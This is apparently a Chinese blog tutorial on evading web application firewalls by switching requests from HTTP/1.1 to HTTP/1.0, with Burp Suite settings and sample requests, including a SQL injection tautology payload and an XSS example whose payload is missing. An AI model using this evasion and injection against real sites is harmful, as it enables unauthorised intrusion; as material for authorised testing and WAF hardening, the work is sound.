HTTP/1.0 协议降级绕过WAF

📅 2026-07-05 ⏱ 8 min read 🏷 WAF绕过 / HTTP

概述

在SRC漏洞挖掘中，经常会遇到WAF拦截的情况。当现代WAF对HTTP/1.1的检测越来越严格时，回退到HTTP/1.0有时能绕过部分解析差异，从而绕过WAF的检测规则。

猫猫提示：有时候"老办法"反而更有效哦~ 就像猫咪喜欢钻纸箱一样

原理分析

HTTP/1.0和HTTP/1.1的主要差异：

1. Host头处理

# HTTP/1.0 不要求Host头
GET /path HTTP/1.0

# HTTP/1.1 必须有Host头
GET /path HTTP/1.1
Host: example.com

2. 连接方式

# HTTP/1.0 默认短连接
Connection: close

# HTTP/1.1 默认长连接
Connection: keep-alive

3. 分块传输

HTTP/1.1支持Transfer-Encoding: chunked，而HTTP/1.0不支持。WAF可能只检查HTTP/1.1的分块编码。

Burp配置

在Burp Suite中修改协议版本：

方法1：Repeater修改

# 原始请求
GET /api/search?q=test HTTP/1.1
Host: target.com

# 修改为
GET /api/search?q=test HTTP/1.0
Host: target.com

方法2：全局配置

Project Options → Connections → HTTP
→ 勾选 "Use HTTP/1.0 for outgoing connections"

实战案例

案例1：SQLi绕过

# HTTP/1.1 被拦截
GET /search?q=1' OR '1'='1 HTTP/1.1
Host: target.com
→ 返回 403 Forbidden

# HTTP/1.0 绕过
GET /search?q=1' OR '1'='1 HTTP/1.0
Host: target.com
→ 返回 200 OK，注入成功

案例2：XSS绕过

# HTTP/1.1 被拦截
GET /page?name= HTTP/1.1
Host: target.com
→ WAF拦截

# HTTP/1.0 绕过
GET /page?name= HTTP/1.0
Host: target.com
→ XSS触发

注意事项

  • 不是所有WAF都受影响，需要实际测试
  • 某些CDN可能会将HTTP/1.0转换为HTTP/1.1
  • 可以结合其他绕过技术（编码、分块等）一起使用
  • 记录成功的payload和场景，积累经验
